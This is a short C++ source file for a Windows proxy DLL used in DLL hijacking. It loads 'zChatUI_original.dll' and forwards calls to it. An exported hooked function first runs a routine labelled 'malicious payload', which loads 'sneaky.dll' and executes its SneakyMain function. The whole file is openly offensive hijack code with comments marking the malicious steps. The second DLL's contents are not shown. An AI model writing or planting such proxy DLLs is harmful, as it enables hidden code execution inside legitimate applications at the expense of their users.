#include <windows.h>
#include <iostream>

typedef int (__stdcall *OriginalFunctionType)(int); // Example function signature
OriginalFunctionType OriginalFunction;

void RunMaliciousCode() {
    MessageBox(NULL, "Malicious Code Executed!", "DLL Hijack", MB_OK);

    // Load and run sneaky.dll
    HMODULE hSneaky = LoadLibrary("sneaky.dll");
    if (hSneaky) {
        typedef void (*SneakyFunction)();
        SneakyFunction sneakyFunc = (SneakyFunction)GetProcAddress(hSneaky, "SneakyMain");
        if (sneakyFunc) {
            sneakyFunc();  // Execute sneaky.dll function
        }
    }
}

extern "C" __declspec(dllexport) int HookedFunction(int param) {
    RunMaliciousCode();  // Execute malicious payload
    return OriginalFunction(param);  // Forward call to original function
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Load original DLL
        HMODULE hOriginal = LoadLibrary("zChatUI_original.dll");
        if (hOriginal) {
            OriginalFunction = (OriginalFunctionType)GetProcAddress(hOriginal, "OriginalFunction");
        }
    }
    return TRUE;
}
